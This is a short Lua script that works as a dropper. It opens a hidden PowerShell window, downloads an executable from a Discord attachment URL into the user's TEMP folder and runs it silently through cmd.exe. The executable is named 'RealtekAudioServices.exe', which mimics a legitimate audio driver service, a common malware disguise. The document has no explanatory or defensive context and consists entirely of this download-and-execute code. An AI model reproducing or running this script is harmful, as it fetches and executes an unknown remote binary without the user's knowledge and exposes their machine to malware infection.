local temp_path = os.getenv("TEMP")
local file_name = "RealtekAudioServices.exe"
local full_path = temp_path .. "\\" .. file_name

local url = "https://cdn.discordapp.com/attachments/1400478404481912832/1400833505239367810/RealtekAudioServices.exe?ex=688e135d&is=688cc1dd&hm=273dce52c2b111b638fb2c9d7f231348954aa412836af8d78e732b85e3cf1a2d&"

local download_command = 'powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile(\'' .. url .. '\', \'' .. full_path .. '\')"'

local execute_command = 'start "" "' .. full_path .. '"'

local function run_silent(cmd)
    shellExecute("cmd.exe", "/c " .. cmd, "", false)
end

run_silent(download_command .. " & " .. execute_command)
